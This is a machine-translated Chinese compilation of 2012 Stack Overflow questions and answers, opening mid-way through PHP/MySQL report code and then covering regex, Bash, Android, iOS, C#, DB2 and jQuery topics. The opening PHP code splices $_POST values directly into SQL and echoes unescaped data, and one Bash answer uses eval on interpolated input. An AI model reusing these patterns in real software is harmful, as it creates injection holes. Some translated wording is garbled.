}

//Build Building AND Statment for query
switch ($buildings) {
    case "both":
    $query_chunk_3='';
    break;
    case "center":
    $query_chunk_3='AND l.building LIKE \'%Center%\'';
    break;
    case "thunder":
    $query_chunk_3='AND l.building LIKE \'%Thunder%\'';
    break;
    default:
    $query_chunk_3='';
}

//check if users is array
if(is_array($users)) {
//Deal With User Array
 //IF ALL IS SET..... GET ALL USERS IGNORE OTHER SELECTIONS
if($_POST['users'][0]=='All') {
    $query_chunk_4="AND  o.operator NOT LIKE ' '";
} else {
    //ELSE WE LOOP THROUGH EACH VALUE AND BUILD THE QUERY STATEMENT

    //Chunk 4 segment 1
    $query_chunk_4 ="AND o.operator IN(";

    //Get Total Array Values To Properly Add Commas to the String
    $i=0; // zero start value counter
    $ar_count=count($_POST['users']); //total elments in array
        foreach($_POST['users'] as $k=>$c)
        {
            $query_chunk_4.="'".$c."'";
            if($i!=$ar_count && $i!=($ar_count-1)){
                $query_chunk_4.=",";
            }
            $i++;
        }
        //Chunk 4 last segment
        $query_chunk_4 .=")";
}
}else { //USERS IS NOT AN ARRAY
$query_chunk_4="AND  o.operator NOT LIKE ' '";
}

//STATIC BEGINING OF QUERY
$query_chunk_1="SELECT pi . * , p.part_number, o.description, l.location, r.received_date
FROM picks AS pi
INNER JOIN parts AS p ON p.part_id = pi.part_id
INNER JOIN operators AS o ON o.operator_id = pi.operator_id
INNER JOIN locations AS l ON l.location_id = pi.location_id
INNER JOIN received AS r ON r.received_id = pi.received_id
WHERE pi.action_id = '11'";

//STATIC END OF QUERY
$query_chunk_last="ORDER BY pi.date_requested ASC";

//MERGE QUERY
$big_chunk_sql=$query_chunk_1 . ' ' . $query_chunk_2 . ' ' . $query_chunk_3 . ' ' . $query_chunk_4 . ' ' . $query_chunk_last;
$big_chunk_query=mysql_query($big_chunk_sql) or die(mysql_error());
//echo "<br> Big Chunk  = ".$big_chunk_sql;

        $i='';
        echo  '<table border="1px" style="width: 761px;" cellspadding="0" cellspacing="0">';
        while($data=mysql_fetch_array($big_chunk_query)) {
           if ($i%2 !=0)
             $rowColor = 'tr1center';
              else
             $rowColor = 'tr2center';
                $pendingdate= trim($data['received_date']);
                $newpendingdate = date('m-d-Y',strtotime($pendingdate));
                echo '<tr class="'.$rowColor.'"><td>'.$data['part_number'] . '</td><td>'.date("m-j-y, g:i a", strtotime($data['date_requested'])) .'</td><td>'
                .$data['description'].'</td><td>'. $data['qty_requested'] . '</td><td>'. $data['location'].'</td><td>'. $newpendingdate . '</td><td> 
                <a href="picking.php?radiopart='.urlencode($data['org_transaction_id']) .'">Mark Picked</a></td></tr>';
                if($data['notes_to_picker']!='') { 
                echo '<tr class="'.$rowColor.'" align="center"><td colspan="2">&nbsp;</td><td align="right"><b>notes:</b></td><td colspan="4">' . $data['notes_to_picker'].'</td></tr>';
                }
                $i++;
            }
            echo '</table></div>';
?> 
```

编辑#2 我在我的成功函数中添加了一个警报（数据），我正在取回看起来像有效的结果，但是此时它似乎没有被写入结果 div 层。这是我的结果弹出窗口我从警报中看到..

```
<table border="1px" style="width: 761px;" cellspadding="0" cellspacing="0"><tr class="tr2center"><td>AS001-70S</td><td>10-9-12, 9:42 am</td><td>Don Ford </td><td>500</td><td>LOAD</td><td>09-28-2010</td><td> 

                <a href="picking.php?radiopart=1005">Mark Picked</a></td></tr><tr class="tr1center"><td>H-016-V75</td><td>10-9-12, 11:28 am</td><td>Don Ford </td><td>80</td><td>LOAD</td><td>09-05-2012</td><td> 

                <a href="picking.php?radiopart=4503">Mark Picked</a></td></tr></table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:03:03.540

好吧，您可以尝试将所需的所有内容（html）放入表单中，然后使用 $('form').serialize() 发送所有内容

在你的成功方法 console.log(data) 或 alert(data) 中查看你得到了什么

利用

这取决于您是否只想检索一个值或值数组，在这种情况下只需发回 json 对象。

在浏览器中打开 Java 控制台以查看是否出现错误。它会更容易。

并在您的 ajax 方法中使用： data: { "postvar": $('some').val(), "other" : 'val' },

这是一个快速的答案；）

# java - java regex lookbehind 如何剪切部分预搜索结果？

> ID：12839971
> 
> 赞同：1
> 
> 时间：2012-10-11T12:51:27.083
> 
> 标签：java, regex, lookbehind

我想知道如何匹配指定区域中的字符串：例如，我有一个 C++ 代码片段：

```
/*
    This is .... bla bla bla...int, float,...
    @author: Tom
*/
int a;
float b; 
```

然后我想找出评论之外的关键字`int`，`float`如何？我在想是否可以使用预搜索。但是一个简单的示例，`\b\w+(?<=er)\b`匹配'worker'，'super'之类的单词，如果我只想要这些结果的子字符串之前怎么办`er`。另一个例子，如果我只需要匹配c ++代码中的行注释，如果我使用`//.*?\n`,the`\n`也在结果中，但我不需要它... **更新：** 我不知道我是否已经清楚地解释了我的问题，我不知道如何给我的问题起个标题.. . :(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:56:52.713

你真的不应该用正则表达式解析源代码。为工作使用正确的工具... 正则表达式不是正确的工具，因为很难将上下文考虑在内。你自己已经观察到了这个问题。

话虽如此，通常，您可以在正则表达式中使用组来获取匹配的一部分。

例如，正则表达式`a(b)c`将匹配字符串`abc`，但结果将包含两个组。

1.  第一组是全场比赛`abc`。
2.  第二组是第一子组`b`。

在 C++ 中匹配单行注释的示例可能如下所示：

```
//(.*?)\n 
```

第一个子组将仅包含评论文本。

# eclipse-rcp - Eclipse RCP：如何更改终端视图的字体大小

> ID：12839973
> 
> 赞同：0
> 
> 时间：2012-10-11T12:51:27.990
> 
> 标签：eclipse-rcp, font-size, eclipse-plugin

我在我的 RCP 应用程序中添加了一个终端视图，我想在用户重新调整窗口大小时更改终端视图的字体大小。可能吗？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:46:51.467

你添加了什么样的控制台？IOConsole 有`setFont()`方法。你可以监听这样的变化：

```
 parent.addListener(SWT.Resize, new Listener() {
        @Override
        public void handleEvent(final Event e) {
            System.out.println(parent.getSize());
           //here change the font size
        }
    }); 
```

# android - Xml 解析终止

> ID：12839977
> 
> 赞同：1
> 
> 时间：2012-10-11T12:51:38.583
> 
> 标签：android, xml, parsing

我试图解析以下xml；

```
 <coupon>
  <MerchantName>Iwantoneofthose.com</MerchantName>
  <MerchantLink>www.redtagdeals.com/iwantoneofthose-coupons</MerchantLink>
   <Title>£5 Off on Orders £30+</Title>
    <CouponCode>5OFFOCT</CouponCode>
     <CouponLink>
         www.redtagdeals.com/online-coupons.php?coupon=1594262&afsrc=1
        </CouponLink>
        <Expirydate>2012-10-15</Expirydate>
       </coupon> 
```

但是解析在遇到字符“£”时终止。

将是什么问题以及如何解决它。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:01:49.310

每当你想解析具有特殊字符的 xml 时，你必须使用编码。即在解析xml而不是正常解析时使用编码，如下所示，

```
 InputSource is = new InputSource(url.openStream());
 is.setEncoding("ISO-8859-1");
 Reader.parse(is); 
```

# c# - 清除 XmlTextWriter 和 StringWriter 中的所有内容

> ID：12839982
> 
> 赞同：11
> 
> 时间：2012-10-11T12:51:52.200
> 
> 标签：c#, xmltextwriter, stringwriter

我想清除 XmlTextWriter 和 StringWriter 中的所有内容。Flush() 没有成功。

`XmlDocument doc = new XmlDocument();` `StringWriter sw = new StringWriter();` `XmlTextWriter xw = new XmlTextWriter(sw);`

`xw.WriteStartElement("AddPhoneQual");` `xw.WriteElementString("Type", "B");` `xw.WriteElementString("PhoneNumber", bookingDetails.PassengerList[0].PhoneNumber);` `xw.WriteEndElement();`// 结束 AddPhoneQual

`doc.LoadXml(sw.ToString());`

现在，我需要清除所有内容并开始用 clear xw 书写。

`xw.Flush();` `sw.Flush();`

他们没有工作。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-04T15:47:48.513

你会认为会有一种直观的方法来做到这一点，但是......

[我发现](http://social.msdn.microsoft.com/Forums/en-US/netfxbcl/thread/537a128e-4518-491b-af5c-51dfd2d6074d/)的一个解决方案建议如下：

```
// make a StringWriter, and fill it with junk
StringWriter sw = new StringWriter();
sw.Write("Don't want to see this");

// and HERE IS THE MAGIC
StringBuilder sb = sw.GetStringBuilder();
sb.Remove(0, sb.Length);

// your StringWriter is now empty! 
```

这对我有用（在与您相同的情况下 - 使用`XmlTextWriter`转储到`StringWriter`）。

也许有人对为什么没有内置这样的东西有一个直观的答案。

# ios - MPMoviePlayer - 在 iOS5 上进入全屏会停止播放并让屏幕变黑

> ID：12839983
> 
> 赞同：0
> 
> 时间：2012-10-11T12:51:58.213
> 
> 标签：ios, ios6, mpmovieplayercontroller

我在应用程序测试期间遇到了一个奇怪的行为。该应用程序包含一个由 a 播放的视频流，`MPMoviePlayer`当在 iOS6 上进入全屏（通过播放器控制器上的按钮）时，屏幕变为空白并且电影停止播放。在 iOS5 上，电影按预期继续。

我相信这将是 iOS6 中的一个错误，因此想知道：
- 还有其他人经历过这种行为吗？
- 这是我的代码中的错误，还是操作系统中的错误？- 关于如何处理它的任何建议？

在两部手机上，当视频包含在屏幕上的帧中（作为视图的一部分）时，视频流会按预期播放。但是，当进入全屏时，它们会有所不同。我已经在两部手机上拍摄了这种行为。

在相对较新的 iPhone 4S（运行 iOS 5.1.1）上，以下（预期）行为：http: [//4340.no/ios5.mov](http://4340.no/ios5.mov)

在 iPhone 3S（升级到 iOS 6.0）上，出现以下（意外）行为：http: [//4340.no/ios6.mov](http://4340.no/ios6.mov)

处理 playButton 的代码：

```
-(IBAction) playButtonClicked:(id)sender
{    
    NSURL* url = [NSURL URLWithString:self.experiment.videoPath];
    self.mpController = [[MPMoviePlayerController alloc] initWithContentURL:url];
    [self.mpController prepareToPlay];
    self.mpController.view.frame = CGRectMake(0, 0, 320, 214);
    [self.view addSubview:self.mpController.view];

    [[NSNotificationCenter defaultCenter]
     addObserver:self
     selector:@selector(movieFinishedCallback:)                                                 
     name:MPMoviePlayerPlaybackDidFinishNotification
     object:self.mpController];

    [self.mpController play];
} 
```

任何有关如何解决此问题的提示或建议将不胜感激。

**验尸 - 代码和解释：**

当电影在iOS6 （而不是 iOS5）上进入全屏时，结果会被调用`viewWillDisapear`。`viewDidDisappear`

解决方案是确保在以这两种方法中的任何一种关闭视频播放器之前`MPMovieplayerController`都没有运行。`fullscreen`

然后我的新代码变成
了：（注意`&& !self.mpController.fullscreen`

```
-(void)viewDidDisappear:(BOOL)animated
{
    if(self.mpController && !self.mpController.fullscreen){
        [[NSNotificationCenter defaultCenter]
            removeObserver:self
            name:MPMoviePlayerPlaybackDidFinishNotification
         object:self.mpController];
        [self.mpController.view removeFromSuperview];
        self.mpController = nil;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:44:07.437

确保您没有在 viewWillDisappear 或 viewDidDisappear 中停止或释放视频播放器。

# bash - 在 Bash 中处理退出状态

> ID：12839985
> 
> 赞同：0
> 
> 时间：2012-10-11T12:52:00.910
> 
> 标签：bash

任何人都可以提出以下功能*测试*的更短的实现（打印相同的错误消息并具有相同的退出状态）？

```
function test
{
   some-command
   exit_status=$?
   if [ $exit_status -ne 0 ]; then
      echo "some-command failed with exit status $exit_status" >&2
   fi
   return $exit_status
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:24:21.010

如果命令成功则立即返回。然后，如果你还没有返回，你就知道有一个错误。这消除了对`if`语句的需要。

```
function newTest {
    some-command && return 0
    exit_status=$?
    echo "some-command failed with exit status $exit_status" >&2
    return $exit_status
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:54:29.003

```
some-command || echo "some-command failed with exit status $?" >&2 
```

如果要捕获并返回退出状态，请执行

```
function test { 
   some-command || r=$? && echo "some-command failed with exit status $r" >&2 && return $r 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:24:07.920

如果您对错误记录的确切内容不是超级挑剔并且总是在错误时终止脚本，那么实现您需要的防弹方法是

```
set -e 
```

添加到脚本的开头。

来自“帮助集”：

```
 -e  Exit immediately if a command exits with a non-zero status. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T13:14:20.867

我的解决方案：

```
#!/bin/bash

test () {
    "$@" || eval "echo '$1 failed with exit status $?' >&2; exit $?" 
} 
```

希望这会有所帮助=)

# android - 适用于 Android 的 Card.io 或 Jumio phonegap/cordova 插件

> ID：12839988
> 
> 赞同：2
> 
> 时间：2012-10-11T12:52:05.853
> 
> 标签：android, cordova, phonegap-plugins, card.io

我需要在 phonegap/cordova 应用程序中实现 Card.io 或 Jumio。我知道 Iphone 存在 card.io phonegap 插件，但我需要为 Android SDK 获取（或实现）它。有人可以指出我正确的方向/文章吗？任何关于如何去做的帮助都会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-17T08:51:39.427

这就是我使 Card.IO 与 phonegap 一起工作的方法......我确信它不是最好的方式/“插件”方式......但是如果你想用你的应用程序快速检查 card.io.. .

```
public class MainActivity extends DroidGap {

private CardIO cardIO;

@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    super.init();
    appView.addJavascriptInterface(cardIO, "cardIO");
    super.loadUrl("file:///android_asset/www/index.html");
}

} 
```

在上面的代码中， CardIO 是一个帮助类，它以通常的方式调用 CardIOActivity。它有一个调用 cardIO getCardDetails() 的辅助方法（对不起，我刚刚失去了这个的源代码..:（但实际上这并不是什么新鲜事/伟大的......只是一个调用心脏活动并返回一个字符串的方法）

现在您可以像这样从您的 javascript 界面调用它：

```
console.log(window.cardIO.getDetails()); 
```

我还想指出，在尝试了这个之后，我发现扫描我尝试过的几张（印度）信用卡非常困难......所以到目前为止，我不会使用 card.io......等到它适合我的需要...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-28T11:20:09.560

我们为 card.io 开发了一个 android 插件插件可以从以下位置下载，

[Cubet Techno 实验室的 phonegap 插件 git 存储库](https://github.com/cubettech/phonegap-plugins/tree/master/Android/card.io)

您需要先集成 card.io android SDK。 [卡 io Android SDK](https://github.com/card-io/card.io-Android-SDK)

享受 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T16:27:23.763

card.io 目前不提供或维护 Android Phone Gap 插件。要创建一个，您需要获取[card.io Android SDK](https://www.card.io/integrate/android)并查看[Phone Gap wiki 关于创建 Android 插件](http://phonegap.pbworks.com/w/page/36753494/How%20to%20Create%20a%20PhoneGap%20Plugin%20for%20Android)的说明。如果您确实创建了一个插件，请务必将其贡献回 Phone Gap 存储库！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-25T18:52:00.623

你可以试试这个插件 [Card.IO for android](http://plugins.cordova.io/#/package/com.keepe.cardio)

# php - DB2 PHP 连接

> ID：12839989
> 
> 赞同：2
> 
> 时间：2012-10-11T12:52:15.593
> 
> 标签：php, db2, ibm-midrange

几天来一直在研究stackoverflow。需要使用 PHP 连接到 DB2 数据库。以下代码不返回错误消息或任何有用的信息，而只是在页面后面中断 Javascript。

```
include(TEMPLATEPATH.'/inc/library/adodb_lite/adodb.inc.php'); 
   $DBName = 'DBNAME';
   $Host = 'IPADDRESS';
   $User = 'USER';
   $Password = 'PASS';

   $db = ADONewConnection('db2');

   $dsn = "driver={IBM db2 odbc DRIVER};Database=$DBName;hostname=$Host;protocol=TCPIP;uid=$User;pwd=$Password";
     if ($db->Connect($dsn)) {
     echo "<div style='color:green;font-size:21px;'>Connection Successful.</div>";
             } else {
                 echo "<div style='color:#cc0000;font-size:21px;'>Connection Failed db->Connect(dsn)</div>";
                 echo 'SQLSTATE: '.$db->ErrorNo()."<br>";
                 echo 'Message: '.$db->ErrorMsg()."<br>";
             } 
```

紧随其后的是[http://adodb.sourceforge.net/](http://adodb.sourceforge.net/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:57:24.340

尝试使用这个

[http://www.sitepoint.com/php-database-db2/](http://www.sitepoint.com/php-database-db2/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T14:02:54.500

我的想法是您的驱动程序名称与您的 odbcinst.ini 文件中的名称不匹配。这是我正在使用的：

odbcinst.ini

```
[iSeries Access ODBC Driver]
Description     = iSeries Access for Linux ODBC Driver
Driver          = /usr/lib/libcwbodbc.so
Setup           = /usr/lib/libcwbodbcs.so
NOTE1           = If using unixODBC 2.2.11 or later and you want the 32 and 64-bit ODBC drivers to share DSN's,
NOTE2           = the following Driver64/Setup64 keywords will provide that support.
Driver64        = /usr/lib/lib64/libcwbodbc.so
Setup64         = /usr/lib/lib64/libcwbodbcs.so
Threading       = 2
DontDLClose     = 1
UsageCount      = 1 
```

请注意，此驱动程序的“名称”被定义为“iSeries Access ODBC 驱动程序”——无论您放在括号 [] 之间的任何内容。

现在我的 PHP 代码如下所示：

```
$this->db_connection = new PDO("odbc:DRIVER={iSeries Access ODBC Driver};SYSTEM=$this->he_database_server;PROTOCOL=TCPIP", $temp_username, $temp_password); 
```

因此，请检查以确保您的驱动程序名称（IBM db2 odbc DRIVER）与您的 odbcinst.ini 文件中的相同。

现在，如果这不能解决问题，我建议您通过将以下内容添加到您的 odbcinst.ini 文件来打开 ODBC 日志记录：

```
[ODBC]
TraceFile = /tmp/odbc.log
Trace = Yes 
```

这会将大量信息写入日志文件，并让您很好地了解问题所在。如果仍然无法正常工作，我唯一的其他建议是最基本的：确保用户名/密码正确，可以从运行 PHP 的服务器访问 AS/400，等等。

# javascript - IE9 不播放通过 JQuery 注入的更新视频源

> ID：12839992
> 
> 赞同：0
> 
> 时间：2012-10-11T12:52:22.237
> 
> 标签：javascript, jquery, html, internet-explorer-9, html5-video

我为 HTML5 视频开发了一个 API。该插件的特点是查看器可以更改正在播放的视频。（通过 JQuery 更改不同的源 url）。

我几乎完成了任务。但它不适用于ie9。让我在这里分享源文件。

```
$hdVideo.attr('src', videoAttr.src[i]);
gPlay();
createSeek();
createBuffer();
playerstage=0; 
```

第一行将新的源文件注入视频元素。它在所有主流浏览器中都能完美运行，除了 ie9。我什至无法检查 ie9 中正在运行的 html 编码（当我们通过 js 进行一些更改时，它不会反映在检查元素中）。

链接位于：http: [//iseofirm.net/appthateam/vel/static3/](http://iseofirm.net/appthateam/vel/static3/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T06:04:43.807

我自己得到了解决方案，终于！！！！！！

问题：IE9 索引第一个标签，即使我们通过 jQuery 将 src="" 注入标签

解决方案：播放器启动时，将第一个“source”元素的“src”值注入标签。

```
if(firstTime)
    {
        $hdVideo.attr('src', videoAttr.src[0]);
        firstTime=0;
    } 
```

然后编写函数将相应的“source url”注入标签的 src="" 属性...

```
var hdswipe = function(){
            var currVid, currExt, currVidName, currQuality, i;
            if($hdVideo.attr('paused')==false)
                playerstage=1;
            currVid = $hdVideo[0].currentSrc;
            currExt = currVid.substr(currVid.lastIndexOf('.') + 1);

            for(i=0; i<videoAttr.quality.length; i++) //Get current video quality
                if(currVid == videoAttr.src[i])
                    currQuality=videoAttr.quality[i];

            for(i=0; i<videoAttr.quality.length; i++) //Swipe the Video
            {
                if((currExt==videoAttr.src[i].substr(videoAttr.src[i].lastIndexOf('.') + 1))&&(currQuality!= videoAttr.quality[i]))
                {  
                    $hdVideo.attr('src', videoAttr.src[i]);
                    gPlay();
                    createSeek();
                    createBuffer();
                    playerstage=0;
                    break;
                }
            }
            if(currQuality == "sd")
                $("a.hd-hd-swipe-button").addClass("hd-hd-swipe-button-hd");
            else
                $("a.hd-hd-swipe-button").removeClass("hd-hd-swipe-button-hd");
            return false;
        } 
```

# java - 如何将元素与二维数组连接起来

> ID：12839998
> 
> 赞同：0
> 
> 时间：2012-10-11T12:52:29.167
> 
> 标签：java, arraylist

我正在尝试创建一个网格 4 列 X 5 行形状的地图，并将每个房间连接在一起。下面的代码可以编译，但是当我尝试运行它时会出现错误。谁能告诉我哪里出错了？谢谢。

```
 public static final int NUM_ROOMS = 20; 

  public static final int NUM_COLS = 4; 

  private ArrayList<Room> myRooms;

  public Map(){

     int row =0;
     ArrayList<Room> myRooms = new ArrayList<Room>();
     while (row<NUM_COLS){
        int i =0;
        i = row % NUM_COLS;
        while(i+1<NUM_COLS){
           while (i+1 <(row+1)% NUM_COLS){
              Room r1 = myRooms.get(i);
              Room r2 = myRooms.get(i+1);
              r1.connectTo(r2);
              r2.connectTo(r1);
              i++;
           }
           row++;
        }

        int col = 0;

        while (col<NUM_COLS){
           i = col; 
           while (i+4<NUM_ROOMS){
             i = i+NUM_COLS; 
            }
            col++;
        }

     }

 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:07:23.323

问题是`myRooms`列表是空的。所以当你试图从列表中取出一个元素时，你会得到一个异常。你必须使用类似的东西

```
for (int i = 0; i < NUM_ROOMS; i++) {
    myRooms.add(new Room());
} 
```

首先填充列表。